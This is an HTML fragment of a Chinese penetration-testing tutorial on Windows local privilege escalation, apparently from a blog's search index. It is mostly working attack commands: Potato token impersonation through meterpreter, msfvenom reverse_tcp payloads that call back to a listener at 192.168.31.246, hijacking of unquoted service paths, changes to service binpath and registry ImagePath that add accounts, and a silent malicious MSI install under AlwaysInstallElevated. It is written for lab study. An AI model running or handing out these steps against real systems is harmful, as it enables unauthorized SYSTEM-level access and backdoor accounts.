-<h5 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h5><h6 id="Host-Information-Gathering-Script：HIGS-bat"><a href="#Host-Information-Gathering-Script：HIGS-bat" class="headerlink" title="Host Information Gathering Script：HIGS.bat"></a>Host Information Gathering Script：HIGS.bat</h6><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://github.com/myh<span class="number">0</span>st/scripts/blob/master/Windows%E<span class="number">4</span>%B<span class="number">8</span>%<span class="number">8</span>B%E<span class="number">4</span>%BF%A<span class="number">1</span>%E<span class="number">6</span>%<span class="number">81</span>%AF%E<span class="number">6</span>%<span class="number">9</span> <span class="number">4</span>%B<span class="number">6</span>%E<span class="number">9</span>%<span class="number">9</span>B%<span class="number">86</span>/HIGS.bat</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/4.png"></p>
-<h6 id="privilege-escalation-awesome-scripts：winPEAS-bat"><a href="#privilege-escalation-awesome-scripts：winPEAS-bat" class="headerlink" title="privilege-escalation-awesome-scripts：winPEAS.bat"></a>privilege-escalation-awesome-scripts：winPEAS.bat</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/carlospolop/</span>privilege-escalation-awesome-scriptssuite<span class="regexp">/blob/m</span>aster<span class="regexp">/winPEAS/</span>winPEASbat/winPEAS.bat</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/M4ximuss/</span>Powerless</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="提权工具脚本"><a href="#提权工具脚本" class="headerlink" title="提权工具脚本"></a>提权工具脚本</h5><h6 id="RottenPotato：-将服务帐户本地提权至SYSTEM"><a href="#RottenPotato：-将服务帐户本地提权至SYSTEM" class="headerlink" title="RottenPotato： 将服务帐户本地提权至SYSTEM"></a>RottenPotato： 将服务帐户本地提权至SYSTEM</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_token –u</span><br><span class="line">upload /root/rottenpotato.exe .</span><br><span class="line">execute <span class="literal">-Hc</span> <span class="operator">-f</span> rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/5.png">)</p>
-<p>基于RottenPotato二次开发的软件：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Origin Potato : https:<span class="regexp">//gi</span>thub.com<span class="regexp">/foxglovesec/</span>Potato </span><br><span class="line"></span><br><span class="line">RottenPotato &amp; JuicyPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ohpe/</span>juicy-potato </span><br><span class="line"></span><br><span class="line">RoguePotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/antonioCoco/</span>RoguePotato </span><br><span class="line"></span><br><span class="line">SweetPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CCob/</span>SweetPotato</span><br></pre></td></tr></table></figure>
-
-<h6 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/6.png"></p>
-<h6 id="Getsystem"><a href="#Getsystem" class="headerlink" title="Getsystem"></a>Getsystem</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/7.png"></p>
-<h3 id="0x02-Windows内核漏洞提权"><a href="#0x02-Windows内核漏洞提权" class="headerlink" title="0x02 Windows内核漏洞提权"></a>0x02 Windows内核漏洞提权</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查Windows版本是否有任何已知的漏洞：</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version“</span></span><br><span class="line"><span class="string">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出所有补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-WmiObject</span> <span class="literal">-query</span> <span class="string">&#x27;select * from win32_quickfixengineering&#x27;</span> | <span class="keyword">foreach</span> &#123;<span class="variable">$_</span>.hotfixid&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出安全更新补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-Hotfix</span> <span class="literal">-description</span> <span class="string">&#x27;Security update&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="windows-kernel-exploits-Windows平台提权漏洞集合"><a href="#windows-kernel-exploits-Windows平台提权漏洞集合" class="headerlink" title="windows-kernel-exploits(Windows平台提权漏洞集合):"></a>windows-kernel-exploits(Windows平台提权漏洞集合):</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecWiki/</span>windows-kernel-exploits</span><br></pre></td></tr></table></figure>
-
-<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/8.png"></p>
-<h4 id="0x03-Windows系统服务漏洞"><a href="#0x03-Windows系统服务漏洞" class="headerlink" title="0x03  Windows系统服务漏洞"></a>0x03  Windows系统服务漏洞</h4><h5 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h5><p>可信任服务路径：存在缺陷的服务程序利用属于可执行文件的文件/文件夹权限， Windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候 也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。</p>
-<p>例如：</p>
-<p>C:\Program Files (x86)\Windows Folder\Common Folder\Folder.exe </p>
-<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">C:<span class="string">\Program.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common</span> Folder<span class="string">\Folder.exe</span></span><br></pre></td></tr></table></figure>
-
-<p>Windows在寻找这个文件的时候，碰见空格会先找寻Program.exe这个文件，如果当前文件下没有Program.exe，则会继续向下走到第二个目录，碰见空格，又执行Windows.exe，以此类推，知道执行到Folder.exe。</p>
-<p>所以，我们可以通过查找系统服务文件中存在的非引用路径，如果一个服务调用可执行文件，没有正确处理引用的全路径名， 则可利用此漏洞。</p>
-<ol>
-<li><h6 id="检查目标主机是否可能存在漏洞："><a href="#检查目标主机是否可能存在漏洞：" class="headerlink" title="检查目标主机是否可能存在漏洞："></a>检查目标主机是否可能存在漏洞：</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span></span><br><span class="line">|findstr/i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/9.png"></p>
-<ol start="2">
-<li><h6 id="检查对有漏洞目录是否有写入权限"><a href="#检查对有漏洞目录是否有写入权限" class="headerlink" title="检查对有漏洞目录是否有写入权限"></a>检查对有漏洞目录是否有写入权限</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>F = 完全控制 </p>
-<p>CI = 容器继承 - 此标志指示从属容器将继承此ACE。 </p>
-<p>OI = Object Inherit - 这个标志表示从属文件将继承ACE</p>
-</blockquote>
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/10.png"></p>
-<ol start="3">
-<li><h6 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">9999</span> <span class="operator">-f</span> exe <span class="literal">-o</span> A.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/11.png"></p>
-<ol start="4">
-<li><h6 id="上传exe到漏洞目录"><a href="#上传exe到漏洞目录" class="headerlink" title="上传exe到漏洞目录"></a>上传exe到漏洞目录</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload A.exe “C:\Program Files (x86)\Program Folder\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/12.png"></p>
-<ol start="5">
-<li><h6 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h6></li>
-</ol>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">handler</span> -H <span class="number">192.168.31.246</span> -P <span class="number">9999</span> -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service”</span></span><br><span class="line"><span class="string">sc start &quot;</span>Vulnerable Service</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/13.png"></p>
-<ol start="7">
-<li><h6 id="设置自动迁移进程，重新开启监听，获取meterpreter"><a href="#设置自动迁移进程，重新开启监听，获取meterpreter" class="headerlink" title="设置自动迁移进程，重新开启监听，获取meterpreter"></a>设置自动迁移进程，重新开启监听，获取meterpreter</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport <span class="number">9999</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> autorunscript migrate –f</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/14.png"></p>
-<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。</p>
-<p>JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。 而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。</p>
-<p>所以如果一个低权限的用户对于此类 系统服务调用的可执行文件具有可写的权限，那么就可以修改服务的属性，将其替换成我们的恶意可执行文件，从 而随着系统启动服务而获得系统权限。</p>
-<ol>
-<li><h6 id="利用accesschk工具检查易受到攻击的服务"><a href="#利用accesschk工具检查易受到攻击的服务" class="headerlink" title="利用accesschk工具检查易受到攻击的服务"></a>利用accesschk工具检查易受到攻击的服务</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">accesschk64.exe <span class="literal">-ucqv</span> “LYXC<span class="string">&quot; * /accepteula</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/15.png"></p>
-</li>
-<li><h6 id="查看可完全控制的服务的属性"><a href="#查看可完全控制的服务的属性" class="headerlink" title=".查看可完全控制的服务的属性"></a>.查看可完全控制的服务的属性</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> qc <span class="string">&quot;Vulnerable Service&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/16.png"></p>
-</li>
-<li><h6 id="修改服务配置执行命令binpath"><a href="#修改服务配置执行命令binpath" class="headerlink" title="修改服务配置执行命令binpath"></a>修改服务配置执行命令binpath</h6><p>BINARY_PATH_NAME参数指向了该服务的可执行程序(Executable.exe)路径。如果我们将这个值修改成任何命令， 那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> config <span class="string">&quot;Vulnerable Service&quot;</span> binpath= <span class="string">&quot;net user zhangsan 123456 /add&quot;</span></span><br><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service&quot;</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;Vulnerable Service&quot;</span> </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/17.png"></p>
-<blockquote>
-<p>Authenticated Users：指Windows系统中所有使用用户名、密码登录并通过身份验证的账户，不包括来宾账户 Guest。也可以使用当前用户用户名来列出所有可以被当前用户修改的服务。 </p>
-<p>SERVICE_ALL_ACCESS：意思是我们对 Vulnerable Service 的属性拥有完全控制权 </p>
-<p>BINARY_PATH_NAME：参数指向了该服务的可执行程序路径。如果我们将这个值修改成任何命令，那意味着这个 命令在该服务下一次启动时，将会以SYSTEM权限运行。</p>
-</blockquote>
-</li>
-</ol>
-<h5 id="不安全的注册表权限"><a href="#不安全的注册表权限" class="headerlink" title="不安全的注册表权限"></a>不安全的注册表权限</h5><p>Windows中,与服务相关的信息存在 <code>HKLM[HKEY_LOCAL_MACHINE]\SYSTEM\CurrentControlSet\Services</code> 注册表中。 如果想查看有关 “易受攻击的服务”的信息，应该检查 <code>HKLM\SYSTEM\ControlSet\Services\Vulnerable Service</code> 的键值。</p>
-<h6 id="工具：-Subinacl"><a href="#工具：-Subinacl" class="headerlink" title="工具： Subinacl"></a>工具： Subinacl</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.microsoft.com<span class="regexp">/en-us/</span>download/details.aspx?id=<span class="number">23510</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">subinacl.exe /keyreg <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /display</span><br></pre></td></tr></table></figure>
-
-<p>如果对注册表项有写入权限，我们可以通过编辑ImagePath值来更改此服务的可执行路径。</p>
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/18.png"></p>
-<ol>
-<li><h6 id="msfvenom生成木马"><a href="#msfvenom生成木马" class="headerlink" title="msfvenom生成木马"></a>msfvenom生成木马</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=hacker PASS=Hacker123<span class="variable">$</span> <span class="operator">-f</span> exe &gt; adduser.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/19.png"></p>
-</li>
-<li><h6 id="上传到机器上"><a href="#上传到机器上" class="headerlink" title="上传到机器上"></a>上传到机器上</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload adduser.exe C:\\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/20.png"></p>
-</li>
-<li><h6 id="执行修改命令"><a href="#执行修改命令" class="headerlink" title="执行修改命令"></a>执行修改命令</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Windows\Temp\adduser.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
-
-<p>注册表被成功替换</p>
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/21.png"></p>
-</li>
-<li><h6 id="重新启动服务，用户被成功添加"><a href="#重新启动服务，用户被成功添加" class="headerlink" title="重新启动服务，用户被成功添加"></a>重新启动服务，用户被成功添加</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/22.png"></p>
-</li>
-</ol>
-<h5 id="不安全的文件-文件夹权限"><a href="#不安全的文件-文件夹权限" class="headerlink" title="不安全的文件/文件夹权限"></a>不安全的文件/文件夹权限</h5><p>这与我们用非引用服务路径所做的非常相似。无引号的服务路径利用了“CreateProcess”功能的弱点，以及服务 的可执行文件路径的文件夹权限。 </p>
-<p>在这里可以直接替换可执行文件。 </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p> 默认的服务文件是C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe 将“Executable.exe”文件替换成一个反弹shell payload，并且当服务重启时，会反弹一个SYSTEM权限的 meterpreter 会话</p>
-<h5 id="Always-Install-Elevated"><a href="#Always-Install-Elevated" class="headerlink" title="Always Install Elevated"></a>Always Install Elevated</h5><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi。</p>
-<p>AlwaysInstallElevated是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权 用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权 限执行任意payload。</p>
-<h6 id="判断是否启用此策略设置："><a href="#判断是否启用此策略设置：" class="headerlink" title="判断是否启用此策略设置："></a>判断是否启用此策略设置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
-
-<p>收到“错误：系统无法找到指定的注册表项或值”的错误，则表示此注册表值从未创建。 说明政策没有启用。 </p>
-<p>收到“AlwaysInstallElevated REG_DWORD 0x1”，说明策略已经启用。</p>
-<h6 id="启用Always-Install-Elevated"><a href="#启用Always-Install-Elevated" class="headerlink" title="启用Always Install Elevated:"></a>启用Always Install Elevated:</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="number">1</span> </span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t</span><br><span class="line">REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><h6 id="使用msfvenom生成恶意msi程序上传"><a href="#使用msfvenom生成恶意msi程序上传" class="headerlink" title="使用msfvenom生成恶意msi程序上传"></a>使用msfvenom生成恶意msi程序上传</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">8881</span> <span class="operator">-f</span> exe <span class="literal">-o</span> localmsf8881.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">msfvenom <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-p</span> windows/exec cmd=<span class="string">&quot;C:\Users\LYXC\AppData\Local\Temp\localmsf8882.exe&quot;</span> &gt; malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加用户</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=test PASS=Password@<span class="number">123</span> -<span class="literal">-platform</span> windows <span class="literal">-a</span> x86 <span class="operator">-f</span> msinouac <span class="literal">-o</span> test.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/23.png"></p>
-<ol start="2">
-<li><h6 id="将这两个上传到目标机器"><a href="#将这两个上传到目标机器" class="headerlink" title="将这两个上传到目标机器"></a>将这两个上传到目标机器</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload localmsf8881.exe C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br><span class="line">meterpreter &gt; upload malicious.msi C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/24.png"></p>
-<ol start="3">
-<li><h6 id="运行恶意程序"><a href="#运行恶意程序" class="headerlink" title="运行恶意程序"></a>运行恶意程序</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\LYXC\AppData\Local\temp\malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment"># /quiet 安装过程中禁止向用户发送消息</span></span><br><span class="line"><span class="comment"># /qn 不使用GUI</span></span><br><span class="line"><span class="comment"># /i 安装程序</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/25.png"></p>
-<p>直接收到了第二个session</p>
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/26.png"></p>
-<p>但是权限依然只是LYXC，并不是System的最高权限，是因为Metasploit生成的msi文件 在运行时没有要求提升权限，所以导致了这个问题，这时可以使用微软官方的MSI生成工具</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://www.exemsi.com/downloads/msi_wrapper/MSI_Wrapper_<span class="number">9</span>_<span class="number">0</span>_<span class="number">42</span>_<span class="number">0</span>.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/27.png"></p>
-<p>上传malicious.msi至靶机，运行恶意程序</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\anthus\AppData\Local\temp\malicious.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
-<p>成功提权</p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
